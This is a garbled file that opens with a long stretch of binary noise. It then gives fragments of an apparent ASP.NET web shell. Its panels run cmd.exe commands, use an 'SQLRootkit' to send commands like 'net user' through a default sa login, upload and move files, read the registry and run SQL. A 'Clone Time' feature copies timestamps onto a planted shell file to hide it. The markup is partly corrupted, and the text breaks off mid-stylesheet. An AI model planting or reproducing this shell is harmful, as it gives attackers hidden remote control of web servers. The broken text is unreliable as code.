eGn}'�� ��iGw��Zo���8�Xi��բh���@tX!]����ɜ��PK@��A�	|!Ӵ�y��� C	�?7�AP��Fa�ߝ��������mp��w�bwy�� �����d�ui�I ����B����7^�8��r�a@��x���U$PЛ��T��A���-�Eȕ2;e;�pv���;k��Z8��fZ�� ��4J�q�r(�#ыݩ���>LI��tO���,bm���oC���:3�C7'����d(& �ƿnpz*f��~g����Qڻ�8��a��ˤ:�����ϥ��FĄ�J+�8��D�ιu�Qk�ƍv�nk�B��ǈȼ'��m5��#�jmEMi=$�@�e|��l��@t_��)֢U���"���;�F�[]�����W�\�mv��܂��T��x�[�~�h�:�����rel�Ƽ�N����gԄ�r�=���� nͦ�,���ع�p���\��DL�n���rz��b
��mmO��÷��Of޴WF�A/�"F7U�Z��-yM�P�����E9�Z�u��l�j�����7.������as����� ;��^Ǔy��뾋��7ջ_\����)��4*���Sǃk�f�J�Ʌ�]b�-��ț\�J��ť�y�ܳ�Yi��|ܻzF۶��&A9\�f��)A�ܐR�AĂ��t"� �	�$V"J���J;S5�~B#��Y��Ŭ_/}����D����	T��Y����^�)l��Ec�F�.��+:��@U�����_`���O��*�"�U�&�\՞۱�/o5m%�����~Z�����O�fx����{�(������@�z�)H{ѩ �\y?�f���<�Ԙ��:��h@�>-�Ү]<kI(��Z�#3q.s����=?�4��,(V���#���ke���Mg�����H�k�y�����Gr�jSɊ�'�H��KL'�C݂��c/9�����C|�� �q�IH^"w:F���������kz���[]���gG�o��q����J�]'u����0��Pu	�2�����fu����5:��Z� �c]����!@�9�O���(��Yx'�h��[��^����ާ�\ۀ�b�)م��d�5���u�� ;�q�+��`#5�9I�6.���$�*�%˃�ƶs�=�^�+I��/�7��6��S�������`Ѣu�ɑ�m[�$�槾����[�����Ǧ3\�$����;�����V߁�1�:oύQ�����C?���#E'A�C���s���-�ȵ�m��'+�q�{���-V�� ��eu�g�w���c��C9dOwZ��A�bQA&�hl�`P����'w^��.�5K\�ܽvn��usIW�B���o����|1��6�3*p}EL���E�ż�>l�}�z��ȧ�3h'o>`+�Z;	��������H]��K�L�{y�+^���]'��EG]�w���X��R�l���XQj�{~�s��gӍae"��1�tC���U�����d!���=9��K1��=�.��`-lO9I�ϐyϋ�)�c�"����S�?�f��`ӱꎏ+"93W��+k�.�7�TȸB�ž��*6wB��� ��P1}Q�o��e��@&���h��=�i�,;"��w-�z�^��J>jd��e���?�{��st�@�Mp5�����V��<��0�81ꐫp��-6�.h���ֈ�V���˩�7s�ja���=��������&�p4�q��w��>�7�יz�*1����eV��af���%�y#t�3���Gy|~����Z���ɖN�W9��&�Me�bd>�~<��#��T̢�!�}��Ɨ@j��d�ىO3�N��2L>;��ɮ
p8��#Ҟ?a��+C�q�K�|Gm���=U��g�bw�I��	�r�*p_�R��Ѵ:�Z������(�r5:3��7`m��GК���U��V7�|̇�mV�\L��?O�ӕ=�"�����KMʪ zH�<>/<}p^ m��]d�Λ�f��&�8���h�����u�i{��鳧s�<�uw�9���m�嘿�ܘ�����g�Go�Z�^�'����5�l�T�P�S�(�9�'8�Cb� ^��Y+"��G��ۅ�X��TA`���8ծ�xk�R�X��l~�Mm��!w���y��b��+Nq�Vy�R[3�^/�1����:f�;�Z�`��'~0W*z8ɻ=�Ҥw�8��I;�����S��Mf��\�ĳ�nd?���묈51�&��7��-�����
�vk⸡�ʠT{<�)SU�<�����1	��O��A����z�t�RH��s�=���5�k��z��luqe�������f���n���gk[n0ҟ4�yM$��%��nJ]&����L�9��7ÑiX��bE$���m�|���;JX��������~��؇q��E.��M�;���ݮP�bS#̆
^�Wsq�\�( L��P�=\����ڍ��d1q��:��,>�ǩs��]��$y��~Q���A6)4j���H���_��W*��pc��g�Z�-�n����=��\�ƒ��١"y5� ��iWL�ۘ�~�`|�ų*�=6!���8�+�b��x9;�:��26�!*#�M��p�q1���2Q���!(oh�eR.3Kv|N6�ޭk�.��b. r8�S��Yz!V��ƚ͆��*h�^�k�)J#�c���J����u��`����ЦzQf���i`�-�F�����5�{^���^�mE�_�^�S��3i6�#�,l��Ӷg��]�`C��s�D�w��G?P�Z7����<=s����U�aſ��S�6�)k���*��>xED�(=�r;�:�����V�iit�[�+\a�YS�u�H� �^�.��8��	`L��~ޅ�*O�F�$|S�R≹�N�p��kaj�/\�1�ǱZ!�|ab(������$_��ߏ	>'aF<���3�M��[��j���IgH_�T�a�pd.,���=Ҫ�К)��ۆj�c�~�W�coH h��Q���<�����;����1�#J����'_�TQ��{Zn��Q��]��="����}O;�1\O��J{G�Ϗ��>7`=��Kڿ_��.���B�%a�1%�f�3�sa�?��6�8�L�f�	H�B٦�D�>y/�V�_����(bQ����%�+$���>��}0���F/��R�|���u��	Ʃ����3Ch�!��,����Y���w��Y׭#e��E�uR���Q;�V���� ժ��
4g��D1��T]�%�0�D�~�~�mu��:A͔�������`:+�^l{���U�O��޷HW��aJ�"Uw�t��*E;�|���V�lu3�Fq�E�����o�r��6�_<T*��d�y��*,`- ��D�
��f�Ǳ�!9��V��*]�֌/J��k��@���Yk�}��)y_c��p�>�m4�����	��&h���&$Q�s��U��lEn0(tHU�B�h���!���ΨB<�N��o�!m?"[����Ȟ�ڢ
"��{D��7;��h��׼2��.�C���p0h����#�m�U�(�:�J*K���U<�y�X�>�i@ʁ?{�
��J0�P�>1����u�oJ�o�/d��ӓ�v 
�嫦�Ga2b<��k��=�Zv��c [���	c�������{ҹ1�G��G)v��h�UӅ���9���7s|#�q`���x���!��;��,���͑8Ѷ�{�8#*1FO��3'������L_�-���A��C`������;b�[Mw�=5pY�f��?�jn�:&fnY�g���qZ*�%H��&88��"=tiUQ>�ۗ�����\ �Gm��&�n�C�Q�"y�<�O%,L�,B�rN#f�jO��XHk�bMI�d�D�:pP�j=�u]��N5z��j�����M>�Ju���ſ�U.C��z�0U\_�z�ū@�v=��C��(�k>ӕ��!L�C��^��%�Ip]@��M(`9u�ݔ�i�NÌЍ��9d�R;��dd���D�6�p}@������N�F6Ω(>CH{�,� -���<5��cUk�\|�{h��B����Mi�-]�a[H�i�GL��}��w�We��X�6z4�3�`�~ܪD+�s> buu�������]}>2�YLr�f?���y�f���T��bEL����svkImZ�|�4&�}�hû(>��%��+��Ƌ�X_w�ǜ`����@OP`�l��	ӊ*(�0�92S����;�ڄ�8(��3x��#��=��
���㹟�(�����Z3��8fi�C�
�$�m���s��q˔�S��ii��Vj��sO���p9�G:�9e�Y���镡���G&R/�s�f��� ͽc}Z�Ht|AoE��PV��
PIyB=��LM�:�J��?YQ&�W�+��>�HZjp�t�	��Gx�����3���V�r��0����!�����Q`�"y�J��'��E|dR$�Qc�P�}	��kKDWOL�e�K�.јܭg�����
I���-J�c	�UK �X_yT��O%j�$/�	t����J�+���x�`eO��/l�n�z���c����Z����� 	T���z�ҾmY���3C;������6U:Sw���vK�����5hXEs�G����'�֜v�ƻ���}�P����h���@��y�ɑ�/u�R�#56�դD�Fp��๺�j� I#���ǋs�̅9�*C�'�5R�s)�
[�RH<Y�DP6\"�x%Ԅt�i�Q��>�ߨ� m/�.?u�tton>
            <asp:Button class="buttom" id="Button_sqlcmd" onclick="Button_showcmdshell_Click" runat="server" Text="SQLRootkit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_sysinfo" onclick="Button_showinfo_Click" runat="server" Text=" SysInfo " Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_db" onclick="ShowData" runat="server" Text="Database" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_reg" onclick="ShowReg" runat="server" Text="Regedit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_about" onclick="ShowAbout" runat="server" Text="About" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_exit" onclick="Logout_click" runat="server" Text="Exit" Width="80px"></asp:Button>
            <hr />
        </asp:Panel>
        <asp:Panel id="FileManager" runat="server" Wrap="False" Width="100%">
            <asp:Label id="Label_Drives" runat="server" enableviewstate="False"></asp:Label>
            <br />
            <asp:Label id="Label_Dir" runat="server" enableviewstate="False">Currently Dir :</asp:Label>
            <asp:TextBox class="TextBox" id="CDir" runat="server" Wrap="False" Width="300px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_GoTo" onclick="GoTo_click" runat="server" ToolTip="Go to the dir" Text=" Go "></asp:Button>
            <asp:Button id="PlasteButton" onclick="Plaste_Click" runat="server" Text="Plaste" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="Label_oper" runat="server" enableviewstate="False">Operate:</asp:Label>
            <asp:TextBox class="TextBox" id="TextBox_FDName" runat="server" Wrap="False" Width="100px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_NewF" onclick="NewFile" runat="server" Text="NewFile"></asp:Button>
            <asp:Button class="buttom" id="Button_NewD" onclick="NewFolder" runat="server" Text="NewDir"></asp:Button>
            <input class="TextBox" id="UpFile" type="file" name="upfile" runat="server" />
            <asp:Button class="buttom" id="Button_UpFile" onclick="UpLoad" runat="server" Text="UpLoad" EnableViewState="False"></asp:Button>
            <HT>
                <br />
                <asp:Label id="Label_files" runat="server" enableviewstate="False" font-size="XX-Small" width="800px"></asp:Label>
                </asp:Panel>
        <asp:Panel id="CMD" runat="server" Wrap="False" ToolTip="CMD" Visible="False" Width="380px">
            <asp:Label id="Label_cmdpath" runat="server" enableviewstate="False" width="100px">Program
            : </asp:Label>
            <asp:TextBox class="TextBox" id="CMDPath" runat="server" Wrap="False" Text="cmd.exe" Width="250px">c:\windows\system32\cmd.exe</asp:TextBox>
            <br />
            <asp:Label id="Label_cmd" runat="server" enableviewstate="False" width="100px">Arguments
            :</asp:Label>
            <asp:TextBox class="TextBox" id="CMDCommand" runat="server" Wrap="False" Width="250px">/c ver</asp:TextBox>
            <asp:Button class="buttom" id="Button_cmdRun" onclick="RunCMD" runat="server" Text="Run" EnableViewState="False"></asp:Button>
            <br />
            <asp:Label id="cmdResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="CloneTime" runat="server" Wrap="False" ToolTip="Clone Time" Visible="False">
            <asp:Label id="Label_rework" runat="server">Rework File or Dir:</asp:Label>
            <asp:TextBox class="TextBox" id="time1" runat="server" Wrap="False" Width="400px">c:\webadmin2XF.aspx</asp:TextBox>
            <br />
            <asp:Label id="Label_copied" runat="server">Copied File or Dir : </asp:Label>
            <asp:TextBox class="TextBox" id="time2" runat="server" Wrap="False" Width="400px">c:\index.aspx</asp:TextBox>
            <br />
            <asp:Button class="buttom" id="Button_clone" onclick="GoCloneTime" runat="server" Text="Clone"></asp:Button>
            <br />
            <asp:Label id="Label_cloneResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SQLRootkit" runat="server" Wrap="False" ToolTip="SQLRootKit" Visible="False">
            <asp:Label id="Label_conn" runat="server" width="100px">ConnString:</asp:Label>
            <asp:TextBox class="TextBox" id="ConStr" runat="server" Wrap="False" Width="500px">server=127.0.0.1;UID=sa;PWD=;Provider=SQLOLEDB</asp:TextBox>
            <br />
            <asp:Label id="Label_sqlcmd" runat="server" width="100px">Command:</asp:Label>
            <asp:TextBox class="TextBox" id="SQLCmd" runat="server" Wrap="False" Width="500px">net user</asp:TextBox>
            <asp:Button class="buttom" id="SQLCmdRun" onclick="CMDSHELL" runat="server" Text="Run"></asp:Button>
            <br />
            <asp:Label id="resultSQL" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SysInfo" runat="server" Wrap="False" ToolTip="System Infomation" Visible="False" EnableViewState="False">
            <table width="80%" align="center" border="1">
                <tbody>
                    <tr>
                        <td colspan="2">
                            Web Server Information</td>
                    </tr>
                    <tr>
                        <td width="40%">
                            Server IP</td>
                        <td width="60%">
                            <asp:Label id="ServerIP" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td height="73">
                            Machine Name</td>
                        <td>
                            <asp:Label id="MachineName" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Network Name</td>
                        <td>
                            <asp:Label id="UserDomainName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            User Name in this Process</td>
                        <td>
                            <asp:Label id="UserName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            OS Version</td>
                        <td>
                            <asp:Label id="OS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Started Time</td>
                        <td>
                            <asp:Label id="StartTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            System Time</td>
                        <td>
                            <asp:Label id="NowTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            IIS Version</td>
                        <td>
                            <asp:Label id="IISV" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            HTTPS</td>
                        <td>
                            <asp:Label id="HTTPS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_INFO</td>
                        <td>
                            <asp:Label id="PATHS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_TRANSLATED</td>
                        <td>
                            <asp:Label id="PATHS2" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
       $   $ 0          <td>
      "                     SERVER_PORT=/td>�   *b   !              <td>
                            <asp:Labe� id=bPORT" rulAt="server"></awp:LabEl<<.td>
   �  �         !   </tr>
                    <tr>
                        <td>
                            SeesionID</td>
                        <td>
                            asp:Label id="SID" runat="server"></asp:Label>=/td>
                  0 </tz>
  �             <?tbgdy>
    "       >/table>
        <?asp:Panel>
        <asp:Panel id="DATA" runat="server" Wrap="False" ToolTip="Manage Database" Visible="False">
            <asp:Label id="label_datacs" runat="server" width=�120px">ConnString :</asp:Label>
            <asp:TextBox class="TextBox" id="DataCStr" runet="server" Wrap="False" Width=�500px"~Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\MyWeb\UpdateWebadmin\guestbook.mdb</asp:TextBox>
            <br />
            <asp:Label id="Label_datatyp%" runat="server" width="120px">Database Type:</asp:Label>
            <asp:RadioButton id="Type_SQL" runat="server" TexT="MSSQL" Width="80px" CssClass="buttom" OnCheckedChanged="DB_onrB_1""GroupName="DBType" AutoPostBack="True"></asp:RadioButton>
            <asp:RadioButton id="Type_Acc" runat="server" Text="Access" Width="80px" ssClass="buttom" OnCheckedChanged="DB_onrB_2" GroupName="DBType" AutoPostBack="True" Checked="True"></asp:RadioButton>
            <asp:Button clars="buttom" id="DB_Submyt" onclick="DB_Submit_Click" runa�="server" Text="Submit" Width="80px"></asp:Button>
         !  <br />
            <!sp:Label id="db_showTable" runat="server"></asp:Label>
            <br />
            <asp:Label id="DB_exe" runat="server" height="37px" visible="Nalse">Execute SQL :</asp:Label>
            <asp:TehtBox id="DB_EStrhng" runat="server" TextMode="MultiLine" Visible="false" Width="500" CssClass="TextBox" Heighd="50px"></asp:TextBox>
       $    <asp:Button id="DB_eButton" onclick="DB_Exec_Click" runat="server" Text="Exec" Visible="false" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="DB_ExecRes" runat="server"></asp:Label>
            <br />
        `   <asp:DataGrid id="DB_DataGrid" runat="server" Width="800px" with="100%" AllOwPaging="true" AllowSorting="trte" OnSortCommand="DB_Sort" PageSize="20" OnPageYndexChanged="DB_Page" PagerStyle-Mode="Nu}ericPages">
                <PagdrStyle mode="NumericPages"></PagerStyle>
            </asp:DataGrid>
        </asp:Panel>
        <asp:Panel id="reg" runat="server" Wrap="False" ToolTip="Read Regedit" Visible="False">
            <asp:Label id="label_rkeyath, File.GetAttributes(path) Or FileAttributes.Archive)
            Else
                If (File.GetAttributes(path) And FileAttributes.Archive) = FileAttributes.Archive Then
                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)
                End If
            End If
            response.Write("<script>alert('Rename Success! Please refresh')</sc"&"ript>")
            response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
        End Sub
    
    Sub Set_Att_Click(Src As Object, E As EventArgs)
        Dim error_x as Exception
        Try
            Call SetAttributes( request("Src") )
        Catch error_x
            ShowError(error_x.Message)
        End Try
    End Sub
    
    Sub ShowCopy(path As String)
        Session("FileAct") = "Copy"
        Session("Source") = path
        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")
        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
    End Sub
    
    Sub ShowCut(path As String)
        Session("FileAct") = "Cut"
        Session("Source") = path
        response.Write("<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc"&"ript>")
        response.Write("<script>location.href='JavaScript:self.close()';</sc"&"ript>")
    End Sub
    
    Sub Plaste_Click(Src As Object, E As EventArgs)
        Dim error_x as Exception
        Try
        Dim tmp As String = Session("Source")
        Dim temp As String
        If right(CDir.Text, 1) <> "\" Then
            temp = CDir.Text & "\"
        Else
            temp = CDir.Text
        End If
        If Session("FileAct") = "Copy" Then
            if right(tmp, 1)="\" then
                directory.createdirectory(temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)))
                call copydir(tmp, temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)) & "\" )
            Else
                file.copy(tmp, temp & Path.GetFileName(tmp))
            End If
            response.Write("<script>alert('Copy success!');</s"&"cript>")
        ElseIf Session("FileAct") = "Cut" Then
            if right(tmp, 1)="\" then
                directory.move(tmp, temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)) & "\")
            Else
                file.move(tmp, temp & Path.GetFileName(tmp) )
            End If
            response.Write("<script>alert('Cut success!');</s"&"cript>")
            Call ShowFolders(CDir.Text)
        Else
            response.Write("<script>alert('Plaste Fail!');</s"&"cript>")
        End If
         Catch error_x
            ShowError(error_x.Message)
         End Try
    End Sub
    
    Sub copydir(a As String , b As String)
          dim xdir as directoryinfo
          dim mydir as new DirectoryInfo(a)
          dim xfile as fileinfo
          for each xfile in mydir.getfiles()
             file.copy(a & xfile.name,b & xfile.name)
          next
          for each xdir in mydir.getdirectories()
             directory.createdirectory(b & path.getfilename(a & xdir.name))
             call copydir(a & xdir.name & "\",b & xdir.name & "\")
          next
    End Sub

</script>
<html>
<head>
    <title> </title> <style type="text/css">BODY {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TD {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TH {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
BODY {
	FONT-SIZE: 14px; BACKGROUND-COLOR: #ffffff
}
A:link {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:visited {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff0000; TEXT-DECORATION: none
}
A:active {
	COLOR: #ff0000; TEXT-DECORATION: none
}
.buttom {
	BORDER-RIGHT: #084b8e 1px solid; BORDER-TOP: #084b8e 1p